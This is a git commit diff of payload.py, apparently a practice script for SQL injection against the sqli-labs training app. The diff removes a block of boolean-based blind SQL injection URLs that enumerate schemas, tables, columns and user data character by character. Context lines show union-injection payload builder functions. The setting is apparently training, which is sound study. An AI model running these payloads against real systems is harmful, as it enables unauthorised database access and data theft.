d5385a4e7e06821dc5beda95263213c0c530c2f3
ShawPandora <50492897+ShawPandora@users.noreply.github.com>
2020-06-11 14:55:07 +0800

    Add files via upload

--- payload.py
+++ payload.py
@@ -1,15 +1,5 @@
 '''
 
-    %27 ' ' '
-    %20 '   '
-
-'''
-
-
-
-
-'''
-
 #union sqlinjection
 
     #查询有几列 id=a ,order by b
@@ -32,59 +22,6 @@
 
 '''
 
-
-
-
-
-'''
-
-#bool sqlinjection
-
-#查数据库实例名
-
-    #查询数据库个数，id=a , < b 
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(schema_name) from information_schema.schemata) < 6)--+
-
-    #查询某个数据库长度,id=a ,limit c , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(schema_name) from information_schema.schemata limit 0,1) < 19)--+
-
-    #查看某个数据库名, id=a , limit c , ),d,1) , < b 
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))) < 106)--+
-
-#查数据库表名
-
-    #查询表个数,id=a, table_schema = 'e' ,< b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(distinct+table_name) from information_schema.tables where table_schema = 'security') < 6)--+
-
-    #查询表名的长度，id=a, table_schema = 'e' , limit c, < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(table_name) from information_schema.tables where table_schema = 'security' limit 0,1) < 7)--+
-
-    #查询表名,id=a, table_schema = 'e' , limit c, ),d,1) , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))) < 102)--+
-
-#查表中列名
-
-    #查询表中列个数,id=a, table_schema = 'e' , table_name = 'f' , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(distinct+column_name) from information_schema.columns where table_schema='security' and table_name='users' ) < 4)--+
-
-    #查询表中列名长度，id=a, table_schema = 'e' , table_name = 'f' , limit c, < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1) < 3)--+
-
-    #查询列名,id=a, table_schema = 'e' , table_name = 'f' , limit c, ),d,1) , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))) < 106)--+
-
-#查数据
-
-    #查询表中数据的行数,id=a, e.f , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select count(*) from security.users ) < 14)--+
-
-    #查询表中数据的长度,id=a , length(g) , e.f , limit c, < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select length(id) from security.users limit 0,1) < 2)--+
-
-    #查询表中数据,id=a , select g , e.f , limit c, ),d,1) , < b
-    http://47.95.4.158:8002/Less-5/?id=1' and ((select ascii(substr((select id from security.users limit 0,1),1,1))) < 50)--+
-
-'''
 
 def order_by(a):        #传入order by所需的列数
     a = str(a)
@@ -148,7 +85,7 @@ def union_sql(num1 = None,num2 = None,schema_name = None,table_name = None,colum
 
 
 
-if __name__ == "__main__":
+'''if __name__ == "__main__":
     b = [1,'aaa',3,'bbb']
     print(order_by(3))
     print(order_list(b))
@@ -156,4 +93,4 @@ if __name__ == "__main__":
     print(union_sql(2,1,None,'table',b))
     print(union_sql(2,1,'database',None,b))
     print(union_sql(2,1,'database','table',[]))
-    print(union_sql(2,1,'database','table',b))
+    print(union_sql(2,1,'database','table',b))'''
